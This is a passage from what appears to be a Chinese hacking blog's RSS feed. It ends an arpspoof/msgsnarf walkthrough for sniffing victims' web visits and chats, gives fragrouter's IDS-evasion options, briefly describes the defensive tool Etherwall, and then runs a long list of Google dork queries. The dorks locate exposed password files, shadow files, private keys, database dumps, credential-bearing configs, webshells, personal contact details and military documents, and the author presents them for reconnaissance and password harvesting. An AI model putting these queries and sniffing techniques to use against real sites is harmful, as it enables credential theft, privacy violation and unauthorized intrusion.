&lt;p&gt;它能捕获受害者访问网站的详细信息。你可以试试msgsnarf捕获即时聊天会话信息，我的意思是如果用户通过雅虎聊天或者任何IRC频道，通过msgsnarf可以捕获受害者所有的谈话，结束攻击需要结束arpspoof。&lt;/p&gt;

&lt;p&gt;root@bt:~# killall arpspoof&lt;br /&gt;
################################################################################&lt;br /&gt;
0x00 fragrouter介绍&lt;/p&gt;

&lt;p&gt;fragrouter是一个具有路由器功能的应用程序，它能够对攻击者发送的攻击流量进行分片处理之后，向攻击目标转发。&lt;/p&gt;

&lt;p&gt;0x01 fragrouter功能&lt;/p&gt;

&lt;p&gt;fragrouter - 入侵检测系统(IDS)逃避工具包&lt;/p&gt;

&lt;p&gt;root@kali:~# fragrouter&lt;br /&gt;
版本：1.6&lt;br /&gt;
用法：fragrouter [-i interface] [-p] [-g hop] [-G hopcount] ATTACK&lt;/p&gt;

&lt;p&gt;其中ATTACK是以下之一：&lt;/p&gt;

&lt;p&gt;-B1：base-1：正常的IP转发&lt;br /&gt;
-F1：frag-1：有序的8字节IP分片&lt;br /&gt;
-F2：frag-2：有序的24字节IP分片&lt;br /&gt;
-F3：frag-3：有序的8字节IP分片，一个失序&lt;br /&gt;
-F4：frag-4：有序的8字节IP分片，一个重复&lt;br /&gt;
-F5：frag-5：无序的8字节片段，一个重复&lt;br /&gt;
-F6：frag-6：有序的8字节片段，标记最后一个Frag&lt;br /&gt;
-F7：frag-7：有序的16字节片段，fwd重写&lt;br /&gt;
-T1：tcp-1：3-whs，错误TCP校验和和FIN/RST，有序的1字节段&lt;br /&gt;
-T3：tcp-3：3-whs，有序的1字节段，一个重复&lt;br /&gt;
-T4：tcp-4：3-whs，有序的1字节段，一次重写&lt;br /&gt;
-T5：tcp-5：3-whs，有序的2字节段，fwd重写&lt;br /&gt;
-T7：tcp-7：3-whs，有序的1字节段，交织空段&lt;br /&gt;
-T8：tcp-8：3-whs，有序的1字节段，一个失序&lt;br /&gt;
-T9：tcp-9：3-whs，无序的1字节段&lt;br /&gt;
-C2：tcbc-2：3-whs，有序的1字节段，交织的SYN&lt;br /&gt;
-C3：tcbc-3：有序的1字节空段，3-whs，有序的1字节段&lt;br /&gt;
-R1：tcbt-1：3-whs，RST，3-whs，有序的1字节段&lt;br /&gt;
-I2：ins-2：3-whs，有序的1字节段，错误TCP校验和&lt;br /&gt;
-I3：ins-3：3-whs，有序的1字节段，不设置ACK&lt;br /&gt;
-M1：misc-1：Windows NT 4 SP2 - &lt;a href=&#34;http://www.dataprotect.com/ntfrag/&#34; target=&#34;_blank&#34;&gt;http://www.dataprotect.com/ntfrag/&lt;/a&gt;&lt;br /&gt;
-M2：misc-2：Linux IP chain - &lt;a href=&#34;http://www.dataprotect.com/ipchains/&#34; target=&#34;_blank&#34;&gt;http://www.dataprotect.com/ipchains/&lt;/a&gt;&lt;br /&gt;
0x02 fragrouter用法示例&lt;br /&gt;
&lt;code&gt;fragrouter -i eth0 -F1&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Etherwall</title>
            <link>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-etherwall/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-etherwall/</guid>
            <description>&lt;p&gt;Etherwall是一款免费且开源的网络安全工具，可以有效防御通过ARP Spoofing/Poisoning进行的中间人攻击(MITM)。同时它也可以防御其他不同类型的攻击，如Sniffing, Hijacking, Netcut, DHCP Spoofing, DNS Spoofing, WEB Spoofing等。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;主要特点  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1.守护进程处理&lt;br /&gt;
2.ARP包过滤&lt;br /&gt;
3.提供点对点/点对多点防御&lt;br /&gt;
4.实时防御&lt;br /&gt;
5.支持以太网和无线网&lt;br /&gt;
6.易于使用并且免费&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Google Hack的一些整理</title>
            <link>http://blog.pytool.com/hacker/2016-10-22-google-hack%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2016-10-22-google-hack%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/</guid>
            <description>

&lt;p&gt;Google Hack的一些整理&lt;br /&gt;
1.在githuh上查找 local.properties 文件&lt;br /&gt;
&lt;code&gt;inurl:local filetype:properties site:github.com&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;drone filetype:yml site:github.com&lt;/code&gt;&lt;br /&gt;
这里是一些关于Google Hack方面的整理&lt;/p&gt;

&lt;p&gt;破解 序列号 Crack Keygen/Serial&lt;/p&gt;

&lt;h1 id=&#34;google搜索技巧挑战隐私-google-hacker&#34;&gt;Google搜索技巧挑战隐私(Google hacker)&lt;/h1&gt;

&lt;p&gt;黑客专用信息和资料搜索地址为：&lt;br /&gt;
&lt;a href=&#34;http://www.google.com/custom?hl=xx-hacker&#34; target=&#34;_blank&#34;&gt;http://www.google.com/custom?hl=xx-hacker&lt;/a&gt;&lt;br /&gt;
这里是google关键字的用法，要设置它为中文，则是&lt;br /&gt;
&lt;a href=&#34;http://www.google.com/custom?hl=zh-CN&#34; target=&#34;_blank&#34;&gt;http://www.google.com/custom?hl=zh-CN&lt;/a&gt;&lt;br /&gt;
英文则是&lt;a href=&#34;http://www.google.com/custom?hl=en&#34; target=&#34;_blank&#34;&gt;http://www.google.com/custom?hl=en&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;常用的google关键字：&lt;br /&gt;
foo1 foo2 (也就是关联，比如搜索xx公司 xx美女)&lt;br /&gt;
operator:foo&lt;br /&gt;
filetype:123 类型&lt;br /&gt;
site:foo.com 相对直接看网站更有意思，可以得到许多意外的信息&lt;br /&gt;
intext:foo&lt;br /&gt;
intitle: fooltitle 标题哦&lt;br /&gt;
allinurl:foo 搜索xx网站的所有相关连接。（踩点必备）&lt;br /&gt;
links:foo 不要说就知道是它的相关链接&lt;br /&gt;
allintilte:foo.com&lt;/p&gt;

&lt;p&gt;我们可以辅助&amp;rdquo;-&amp;rdquo; &amp;ldquo;+&amp;ldquo;来调整搜索的精确程度&lt;/p&gt;

&lt;p&gt;直接搜索密码：(引号表示为精确搜索)&lt;br /&gt;
当然我们可以再延伸到上面的结果里进行二次搜索&lt;br /&gt;
&amp;ldquo;index of&amp;rdquo; htpasswd / passwd&lt;br /&gt;
filetype:xls username password email&lt;br /&gt;
&amp;ldquo;ws_ftp.log&amp;rdquo;&lt;br /&gt;
&amp;ldquo;config.php&amp;rdquo;&lt;br /&gt;
allinurl:admin mdb&lt;br /&gt;
service filetype:pwd ….或者某个比如pcanywhere的密码后缀cif等&lt;/p&gt;

&lt;p&gt;越来越有意思了，再来点更敏感信息&lt;br /&gt;
&amp;ldquo;robots.txt&amp;rdquo; &amp;ldquo;Disallow:&amp;rdquo; filetype:txt&lt;br /&gt;
inurl:_vti_cnf (FrontPage的关键索引啦，扫描器的CGI库一般都有地)&lt;br /&gt;
allinurl: /msadc/Samples/selector/showcode.asp&lt;br /&gt;
/../../../passwd&lt;br /&gt;
/examples/jsp/snp/snoop.jsp&lt;br /&gt;
phpsysinfo&lt;br /&gt;
intitle:index of /admin&lt;br /&gt;
intitle:&amp;ldquo;documetation&amp;rdquo;&lt;br /&gt;
inurl: 5800(vnc的端口)或者desktop port等多个关键字检索&lt;br /&gt;
webmin port 10000&lt;br /&gt;
inurl:/admin/login.asp&lt;br /&gt;
intext:Powered by GBook365&lt;br /&gt;
intitle:&amp;ldquo;php shell*&amp;rdquo; &amp;ldquo;Enable stderr&amp;rdquo; filetype:php 直接搜索到phpwebshell&lt;/p&gt;

&lt;p&gt;foo.org filetype:inc&lt;/p&gt;

&lt;p&gt;ipsec filetype:conf&lt;br /&gt;
intilte:&amp;ldquo;error occurred&amp;rdquo; ODBC request WHERE (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射，会发达哦&lt;br /&gt;
intitle:&amp;ldquo;php shell*&amp;rdquo; &amp;ldquo;Enable stderr&amp;rdquo; filetype:php&lt;br /&gt;
&amp;ldquo;Dumping data for table&amp;rdquo; username password&lt;br /&gt;
intitle:&amp;ldquo;Error using Hypernews&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Server Software&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;HTTP_USER_AGENT=Googlebot&amp;rdquo;&lt;br /&gt;
&amp;ldquo;HTTP_USER_ANGET=Googlebot&amp;rdquo; THS ADMIN&lt;br /&gt;
filetype:.doc site:.mil classified 直接搜索军方相关word&lt;/p&gt;

&lt;p&gt;检查多个关键字：&lt;br /&gt;
intitle:config confixx login password&lt;/p&gt;

&lt;p&gt;&amp;ldquo;mydomain.com&amp;rdquo; nessus report&lt;br /&gt;
&amp;ldquo;report generated by&amp;rdquo;&lt;br /&gt;
&amp;ldquo;ipconfig&amp;rdquo;&lt;br /&gt;
&amp;ldquo;winipconfig&amp;rdquo;&lt;/p&gt;

&lt;p&gt;google缓存利用（hoho，最有影响力的东西）推荐大家搜索时候多&amp;rdquo;选搜索所有网站&amp;rdquo;&lt;br /&gt;
特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典嘛&lt;br /&gt;
cache:foo.com&lt;/p&gt;

&lt;p&gt;可以查阅类似结果&lt;/p&gt;

&lt;p&gt;先找找网站的管理后台地址：&lt;br /&gt;
site:xxxx.com intext:管理&lt;br /&gt;
site:xxxx.com inurl:login&lt;br /&gt;
site:xxxx.com intitle:管理&lt;br /&gt;
site:a2.xxxx.com inurl:file&lt;br /&gt;
site:a3.xxxx.com inurl:load&lt;br /&gt;
site:a2.xxxx.com intext:ftp://&lt;em&gt;:&lt;/em&gt;&lt;br /&gt;
site:a2.xxxx.com filetype:asp&lt;br /&gt;
site:xxxx.com //得到N个二级域名&lt;br /&gt;
site:xxxx.com intext:*@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的&lt;br /&gt;
site:xxxx.com intext:电话 //N个电话&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; etc&lt;br /&gt;
intitle:&amp;ldquo;Index of&amp;rdquo; .sh_history&lt;br /&gt;
intitle:&amp;ldquo;Index of&amp;rdquo; .bash_history&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; passwd&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; people.lst&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; pwd.db&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; etc/shadow&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; spwd&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; master.passwd&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; htpasswd&lt;br /&gt;
&amp;rdquo;# -FrontPage-&amp;rdquo; inurl:service.pwd&lt;/p&gt;

&lt;p&gt;allinurl:bbs data&lt;br /&gt;
filetype:mdb inurl:database&lt;br /&gt;
filetype:inc conn&lt;br /&gt;
inurl:data filetype:mdb&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; data&lt;br /&gt;
……&lt;/p&gt;

&lt;p&gt;一些技巧集合：&lt;/p&gt;

&lt;p&gt;3) &amp;ldquo;http://&lt;em&gt;:&lt;/em&gt;@www&amp;rdquo; domainname 找一些ISP站点，可以查对方ip的虚拟主机&lt;br /&gt;
3&lt;br /&gt;
4) auth_user_file.txt 不实用了，太老了&lt;/p&gt;

&lt;p&gt;5) The Master List 寻找邮件列表的&lt;/p&gt;

&lt;p&gt;6) intitle:&amp;ldquo;welcome.to.squeezebox&amp;rdquo; 一种特殊的管理系统，默认开放端口90&lt;br /&gt;
7) passlist.txt (a better way) 字典&lt;/p&gt;

&lt;p&gt;8) &amp;ldquo;A syntax error has occurred&amp;rdquo; filetype:ihtml&lt;/p&gt;

&lt;p&gt;9) ext:php program_listing intitle:MythWeb.Program.Listing&lt;br /&gt;
10) intitle:index.of abyss.conf&lt;br /&gt;
11)ext:nbe nbe&lt;/p&gt;

&lt;p&gt;12)intitle:&amp;ldquo;SWW link&amp;rdquo; &amp;ldquo;Please wait…..&amp;rdquo;&lt;br /&gt;
13)&lt;/p&gt;

&lt;p&gt;14) intitle:&amp;ldquo;Freifunk.Net – Status&amp;rdquo; -site:commando.de&lt;/p&gt;

&lt;p&gt;15) intitle:&amp;ldquo;WorldClient&amp;rdquo; intext:&amp;ldquo;? (2003|2004) Alt-N Technologies.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;17) intitle:open-xchange inurl:login.pl&lt;/p&gt;

&lt;p&gt;20) intitle:&amp;ldquo;site administration: please log in&amp;rdquo; &amp;ldquo;site designed by emarketsouth&amp;rdquo;&lt;br /&gt;
21) ORA-00921: unexpected end of SQL command&lt;/p&gt;

&lt;p&gt;22)intitle:&amp;ldquo;YALA: Yet Another LDAP Administrator&amp;rdquo;&lt;br /&gt;
23)welcome.to phpqladmin &amp;ldquo;Please login&amp;rdquo; -cvsweb&lt;br /&gt;
24)intitle:&amp;ldquo;SWW link&amp;rdquo; &amp;ldquo;Please wait…..&amp;rdquo;&lt;br /&gt;
25)inurl:&amp;ldquo;port_255&amp;rdquo; -htm&lt;/p&gt;

&lt;p&gt;27)intitle:&amp;ldquo;WorldClient&amp;rdquo; intext:&amp;ldquo;? (2003|2004) Alt-N Technologies.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;这些是新的一些漏洞技巧，在0days公告公布&lt;/p&gt;

&lt;p&gt;ext:php program_listing intitle:MythWeb.Program.Listing&lt;/p&gt;

&lt;p&gt;inurl:preferences.ini &amp;ldquo;[emule]&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Index of /CFIDE/&amp;rdquo; administrator&lt;/p&gt;

&lt;p&gt;&amp;ldquo;access denied for user&amp;rdquo; &amp;ldquo;using password&amp;rdquo;&lt;/p&gt;

&lt;p&gt;ext:php intext:&amp;ldquo;Powered by phpNewMan Version&amp;rdquo; 可以看到：path/to/news/browse.php?clang=../../../../../../file/i/want&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;/becommunity/community/index.php?pageurl=&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;ASP FileMan&amp;rdquo; Resend -site:iisworks.com&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Enter ip&amp;rdquo; inurl:&amp;ldquo;php-ping.php&amp;rdquo;&lt;/p&gt;

&lt;p&gt;ext:conf inurl:rsyncd.conf -cvs -man&lt;/p&gt;

&lt;p&gt;intitle: private, protected, secret, secure, winnt&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;DocuShare&amp;rdquo; inurl:&amp;ldquo;docushare/dsweb/&amp;rdquo; -faq -gov -edu&lt;br /&gt;
&amp;rdquo;#mysql dump&amp;rdquo; filetype:sql&lt;/p&gt;

&lt;p&gt;&amp;ldquo;allow_call_time_pass_reference&amp;rdquo; &amp;ldquo;PATH_INFO&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Certificate Practice Statement&amp;rdquo; inurl:(PDF | DOC)&lt;/p&gt;

&lt;p&gt;LeapFTP intitle:&amp;ldquo;index.of./&amp;rdquo; sites.ini modified&lt;br /&gt;
master.passwd&lt;/p&gt;

&lt;p&gt;mysql history files&lt;br /&gt;
NickServ registration passwords&lt;br /&gt;
passlist&lt;br /&gt;
passlist.txt (a better way)&lt;br /&gt;
passwd&lt;br /&gt;
passwd / etc (reliable)&lt;br /&gt;
people.lst&lt;br /&gt;
psyBNC config files&lt;br /&gt;
pwd.db&lt;br /&gt;
signin filetype:url&lt;br /&gt;
spwd.db / passwd&lt;br /&gt;
trillian.ini&lt;br /&gt;
wwwboard WebAdmin inurl:passwd.txt wwwboard|webadmin&lt;/p&gt;

&lt;p&gt;&amp;rdquo;# -FrontPage-&amp;rdquo; ext:pwd inurl:(service | authors | administrators | users) &amp;ldquo;# -FrontPage-&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:service.pwd&lt;br /&gt;
&amp;ldquo;AutoCreate=TRUE password=&lt;em&gt;&amp;rdquo;&lt;br /&gt;
&amp;ldquo;http://&lt;/em&gt;:*@www&amp;rdquo; domainname&lt;br /&gt;
&amp;ldquo;index of/&amp;rdquo; &amp;ldquo;ws_ftp.ini&amp;rdquo; &amp;ldquo;parent directory&amp;rdquo;&lt;br /&gt;
&amp;ldquo;liveice configuration file&amp;rdquo; ext:cfg -site:sourceforge.net&lt;br /&gt;
&amp;ldquo;powered by ducalendar&amp;rdquo; -site:duware.com&lt;br /&gt;
&amp;ldquo;Powered by Duclassified&amp;rdquo; -site:duware.com&lt;br /&gt;
&amp;ldquo;Powered by Duclassified&amp;rdquo; -site:duware.com &amp;ldquo;DUware All Rights reserved&amp;rdquo;&lt;br /&gt;
&amp;ldquo;powered by duclassmate&amp;rdquo; -site:duware.com&lt;br /&gt;
&amp;ldquo;Powered by Dudirectory&amp;rdquo; -site:duware.com&lt;br /&gt;
&amp;ldquo;powered by dudownload&amp;rdquo; -site:duware.com&lt;br /&gt;
&amp;ldquo;Powered By Elite Forum Version &lt;em&gt;.&lt;/em&gt;&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Powered by Link Department&amp;rdquo;&lt;br /&gt;
&amp;ldquo;sets mode: +k&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Powered by DUpaypal&amp;rdquo; -site:duware.com&lt;br /&gt;
allinurl: admin mdb&lt;br /&gt;
auth_user_file.txt&lt;br /&gt;
config.php&lt;br /&gt;
eggdrop filetype:user user&lt;br /&gt;
etc (index.of)&lt;br /&gt;
ext:ini eudora.ini&lt;br /&gt;
ext:ini Version=… password&lt;br /&gt;
ext:txt inurl:unattend.txt&lt;/p&gt;

&lt;p&gt;filetype:bak inurl:&amp;ldquo;htaccess|passwd|shadow|htusers&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:cfg mrtg &amp;ldquo;target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot; -sample -cvs -example  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;filetype:cfm &amp;ldquo;cfapplication name&amp;rdquo; password&lt;/p&gt;

&lt;p&gt;filetype:conf oekakibbs&lt;br /&gt;
filetype:conf sc_serv.conf&lt;/p&gt;

&lt;p&gt;filetype:conf slapd.conf&lt;/p&gt;

&lt;p&gt;filetype:config config intext:appSettings &amp;ldquo;User ID&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:dat &amp;ldquo;password.dat&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:dat wand.dat&lt;/p&gt;

&lt;p&gt;filetype:inc dbconn&lt;/p&gt;

&lt;p&gt;filetype:inc intext:mysql_connect&lt;br /&gt;
filetype:inc mysql_connect OR mysql_pconnect&lt;/p&gt;

&lt;p&gt;filetype:inf sysprep&lt;/p&gt;

&lt;p&gt;filetype:ini inurl:&amp;ldquo;serv-u.ini&amp;rdquo;&lt;br /&gt;
filetype:ini inurl:flashFXP.ini&lt;br /&gt;
filetype:ini ServUDaemon&lt;br /&gt;
filetype:ini wcx_ftp&lt;br /&gt;
filetype:ini ws_ftp pwd&lt;/p&gt;

&lt;p&gt;filetype:ldb admin&lt;/p&gt;

&lt;p&gt;filetype:log &amp;ldquo;See `ipsec copyright&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:log inurl:&amp;ldquo;password.log&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:mdb inurl:users.mdb&lt;/p&gt;

&lt;p&gt;filetype:mdb wwforum&lt;/p&gt;

&lt;p&gt;filetype:netrc password&lt;/p&gt;

&lt;p&gt;filetype:pass pass intext:userid&lt;/p&gt;

&lt;p&gt;filetype:pem intext:private&lt;/p&gt;

&lt;p&gt;filetype:properties inurl:db intext:password&lt;/p&gt;

&lt;p&gt;filetype:pwd service&lt;br /&gt;
filetype:pwl pwl&lt;/p&gt;

&lt;p&gt;filetype:reg reg +intext:&amp;ldquo;defaultusername&amp;rdquo; +intext:&amp;ldquo;defaultpassword&amp;rdquo;&lt;br /&gt;
filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS&lt;br /&gt;
filetype:sql (&amp;ldquo;values * MD&amp;rdquo; | &amp;ldquo;values * password&amp;rdquo; | &amp;ldquo;values * encrypt&amp;rdquo;)&lt;br /&gt;
filetype:sql (&amp;ldquo;passwd values&amp;rdquo; | &amp;ldquo;password values&amp;rdquo; | &amp;ldquo;pass values&amp;rdquo; )&lt;br /&gt;
filetype:sql +&amp;ldquo;IDENTIFIED BY&amp;rdquo; -cvs&lt;br /&gt;
filetype:sql password&lt;/p&gt;

&lt;p&gt;filetype:url +inurl:&amp;ldquo;ftp://&amp;rdquo; +inurl:&amp;ldquo;;@&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:xls username password email&lt;/p&gt;

&lt;p&gt;htpasswd&lt;br /&gt;
htpasswd / htgroup&lt;br /&gt;
htpasswd / htpasswd.bak&lt;/p&gt;

&lt;p&gt;intext:&amp;ldquo;enable secret $&amp;rdquo;&lt;br /&gt;
intext:&amp;ldquo;powered by Web Wiz Journal&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;index of&amp;rdquo; intext:connect.inc&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; intext:globals.inc&lt;br /&gt;
intitle:&amp;ldquo;Index of&amp;rdquo; passwords modified&lt;/p&gt;

&lt;p&gt;intitle:dupics inurl:(add.asp | default.asp | view.asp | voting.asp) -site:duware.com&lt;br /&gt;
———————————————————————————————————————-&lt;/p&gt;

&lt;p&gt;intitle:index.of intext:&amp;ldquo;secring.skr&amp;rdquo;|&amp;ldquo;secring.pgp&amp;rdquo;|&amp;ldquo;secring.bak&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;GRC.DAT&amp;rdquo; intext:&amp;ldquo;password&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;slapd.conf&amp;rdquo; intext:&amp;ldquo;credentials&amp;rdquo; -manpage -&amp;ldquo;Manual Page&amp;rdquo; -man: -sample&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;slapd.conf&amp;rdquo; intext:&amp;ldquo;rootpw&amp;rdquo; -manpage -&amp;ldquo;Manual Page&amp;rdquo; -man: -sample&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;wvdial.conf&amp;rdquo; intext:&amp;ldquo;password&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:/db/main.mdb&lt;/p&gt;

&lt;p&gt;inurl:chap-secrets -cvs&lt;/p&gt;

&lt;p&gt;inurl:config.php dbuname dbpass&lt;br /&gt;
inurl:filezilla.xml -cvs&lt;/p&gt;

&lt;p&gt;inurl:lilo.conf filetype:conf password -tatercounter -bootpwd -man&lt;/p&gt;

&lt;p&gt;inurl:nuke filetype:sql&lt;/p&gt;

&lt;p&gt;inurl:ospfd.conf intext:password -sample -test -tutorial -download 路由配置&lt;br /&gt;
inurl:pap-secrets -cvs&lt;/p&gt;

&lt;p&gt;inurl:perform filetype:ini&lt;br /&gt;
inurl:secring ext:skr | ext:pgp | ext:bak&lt;/p&gt;

&lt;p&gt;inurl:vtund.conf intext:pass -cvs&lt;/p&gt;

&lt;p&gt;inurl:zebra.conf intext:password -sample -test -tutorial -download&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Generated by phpSystem&amp;rdquo;&lt;br /&gt;
&amp;ldquo;generated by wwwstat&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Host Vulnerability Summary Report&amp;rdquo; ]&lt;/p&gt;

&lt;p&gt;&amp;ldquo;HTTP_FROM=googlebot&amp;rdquo; googlebot.com &amp;ldquo;Server_Software=&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Index of&amp;rdquo; / &amp;ldquo;chat/logs&amp;rdquo; 聊天室&lt;br /&gt;
&amp;ldquo;Installed Objects Scanner&amp;rdquo; inurl:default.asp&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Mecury Version&amp;rdquo; &amp;ldquo;Infastructure Group&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Microsoft &amp;reg; Windows * &amp;trade; Version * DrWtsn Copyright &amp;copy;&amp;rdquo; ext:log&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Most Submitted Forms and Scripts&amp;rdquo; &amp;ldquo;this section&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Network Vulnerability Assessment Report&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;not for distribution&amp;rdquo; confidential&lt;br /&gt;
&amp;ldquo;phone * * *&amp;rdquo; &amp;ldquo;address *&amp;rdquo; &amp;ldquo;e-mail&amp;rdquo; intitle:&amp;ldquo;curriculum vitae&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;phpMyAdmin&amp;rdquo; &amp;ldquo;running on&amp;rdquo; inurl:&amp;ldquo;main.php&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;produced by getstats&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Request Details&amp;rdquo; &amp;ldquo;Control Tree&amp;rdquo; &amp;ldquo;Server Variables&amp;rdquo;&lt;br /&gt;
&amp;ldquo;robots.txt&amp;rdquo; &amp;ldquo;Disallow:&amp;rdquo; filetype:txt&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Running in Child mode&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;sets mode: +p&amp;rdquo;&lt;br /&gt;
&amp;ldquo;sets mode: +s&amp;rdquo;&lt;br /&gt;
&amp;ldquo;Thank you for your order&amp;rdquo; +receipt&lt;br /&gt;
&amp;ldquo;This is a Shareaza Node&amp;rdquo;&lt;br /&gt;
&amp;ldquo;This report was generated by WebLog&amp;rdquo;&lt;br /&gt;
( filetype:mail | filetype:eml | filetype:mbox | filetype:mbx ) intext:password|subject&lt;/p&gt;

&lt;p&gt;(inurl:&amp;ldquo;robot.txt&amp;rdquo; | inurl:&amp;ldquo;robots.txt&amp;rdquo; ) intext:disallow filetype:txt&lt;/p&gt;

&lt;p&gt;-site:php.net -&amp;ldquo;The PHP Group&amp;rdquo; inurl:source inurl:url ext:pHp&lt;/p&gt;

&lt;p&gt;FBR &amp;ldquo;ADOBE PHOTOSHOP&amp;rdquo;&lt;br /&gt;
AIM buddy lists&lt;br /&gt;
allinurl:/examples/jsp/snp/snoop.jsp&lt;br /&gt;
allinurl:servlet/SnoopServlet&lt;br /&gt;
cgiirc.conf&lt;/p&gt;

&lt;p&gt;data filetype:mdb -site:gov -site:mil&lt;/p&gt;

&lt;p&gt;exported email addresses&lt;/p&gt;

&lt;p&gt;ext:asp inurl:pathto.asp&lt;/p&gt;

&lt;p&gt;ext:cgi inurl:editcgi.cgi inurl:file=&lt;/p&gt;

&lt;p&gt;ext:conf inurl:rsyncd.conf -cvs -man&lt;br /&gt;
ext:conf NoCatAuth -cvs&lt;/p&gt;

&lt;p&gt;ext:dat bpk.dat&lt;br /&gt;
ext:gho gho&lt;/p&gt;

&lt;p&gt;ext:ini intext:env.ini&lt;br /&gt;
ext:ldif ldif&lt;/p&gt;

&lt;p&gt;ext:log &amp;ldquo;Software: Microsoft Internet Information Services &lt;em&gt;.&lt;/em&gt;&amp;rdquo;&lt;br /&gt;
——————————————————————————————&lt;br /&gt;
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb&lt;/p&gt;

&lt;p&gt;filetype:bkf bkf&lt;br /&gt;
filetype:blt &amp;ldquo;buddylist&amp;rdquo;&lt;br /&gt;
filetype:blt blt +intext:screenname&lt;/p&gt;

&lt;p&gt;filetype:cfg auto_inst.cfg&lt;/p&gt;

&lt;p&gt;filetype:conf inurl:firewall -intitle:cvs&lt;br /&gt;
filetype:config web.config -CVS&lt;/p&gt;

&lt;p&gt;filetype:ctt ctt messenger&lt;/p&gt;

&lt;p&gt;filetype:fp fp&lt;br /&gt;
filetype:fp fp -site:gov -site:mil -&amp;ldquo;cvs log&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:inf inurl:capolicy.inf&lt;br /&gt;
filetype:lic lic intext:key&lt;/p&gt;

&lt;p&gt;filetype:myd myd -CVS&lt;br /&gt;
filetype:ns ns&lt;br /&gt;
filetype:ora ora&lt;br /&gt;
filetype:ora tnsnames&lt;br /&gt;
filetype:pdb pdb backup (Pilot | Pluckerdb)&lt;/p&gt;

&lt;p&gt;filetype:pot inurl:john.pot&lt;br /&gt;
——————————————————————————————————————&lt;br /&gt;
filetype:pst inurl:&amp;ldquo;outlook.pst&amp;rdquo;&lt;br /&gt;
filetype:pst pst -from -to -date&lt;br /&gt;
filetype:qbb qbb&lt;br /&gt;
filetype:rdp rdp&lt;/p&gt;

&lt;p&gt;filetype:reg &amp;ldquo;Terminal Server Client&amp;rdquo;&lt;br /&gt;
filetype:vcs vcs&lt;br /&gt;
filetype:wab wab&lt;/p&gt;

&lt;p&gt;filetype:xls -site:gov inurl:contact&lt;br /&gt;
filetype:xls inurl:&amp;ldquo;email.xls&amp;rdquo;&lt;br /&gt;
Financial spreadsheets: finance.xls&lt;br /&gt;
Financial spreadsheets: finances.xls&lt;/p&gt;

